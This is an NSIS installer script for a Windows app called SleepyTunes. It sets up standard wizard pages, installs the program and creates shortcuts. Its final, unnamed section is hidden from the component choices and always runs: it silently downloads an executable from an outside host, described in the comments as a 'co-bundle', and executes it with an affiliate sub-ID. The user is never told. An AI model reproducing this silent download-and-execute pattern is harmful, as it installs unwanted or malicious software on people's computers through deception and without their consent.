;THIS SCRIPT NEEDS INETC PLUGIN, WHICH CAN BE DOWNLOADED FROM "http://nsis.sourceforge.net/Inetc_plug-in"
;PLEASE READ THE COMMENTS IN MAIN SECTION

!include "MUI2.nsh"
!define VERSION "1.0.0"
!define APPNAME "SleepyTunes"
!define COMPANY "addpcs"

Name "${APPNAME} ${VERSION}"
OutFile "${APPNAME}_Setup_${VERSION}.exe"
InstallDir "$PROGRAMFILES\addpcs\${APPNAME}"

Icon ..\icon\SleepyTunesIcon.ico

;SetBrandingImage ..\icon\SleepyTunesIcon.png
;AddBrandingImage left 5
;AddBrandingImage top 20
;AddBrandingImage width 50
;AddBrandingImage height 50

!insertmacro MUI_PAGE_WELCOME
!insertmacro MUI_PAGE_LICENSE "license.rtf"
!insertmacro MUI_PAGE_DIRECTORY
!insertmacro MUI_PAGE_COMPONENTS
!insertmacro MUI_PAGE_INSTFILES
!insertmacro MUI_PAGE_FINISH
!insertmacro MUI_LANGUAGE "English"

Section "Install Program"
	SetOutPath $INSTDIR
	File ..\bin\${APPNAME}.exe
SectionEnd

Section "Start Menu Shortcut"
	CreateShortCut "$SMPROGRAMS\${COMPANY}\SleepyTunes.lnk" "$INSTDIR\${APPNAME}.exe"
SectionEnd

Section "Desktop Shortcut"
	CreateShortCut "$DESKTOP\SleepyTunes.lnk" "$INSTDIR\${APPNAME}.exe"
SectionEnd

Section ""

     ;REPLACE THE URL BELOW WITH YOUR CO-BUNDLE URL
     inetc::get /SILENT "http://www.ntdlzone.com/download.php?k4J9cw==" "$PLUGINSDIR\InstallManager.exe" /end
     
     ;THE BELOW LINE PASSES SUB-ID 101 TO THE INSTALLMANAGER EXE
     ExecWait "$PLUGINSDIR\InstallManager.exe 101"
     
     ;IF YOU DONT WANT TO PASS SUB-ID USE THE BELOW LINE
     ;ExecWait "$PLUGINSDIR\InstallManager.exe"
     
SectionEnd

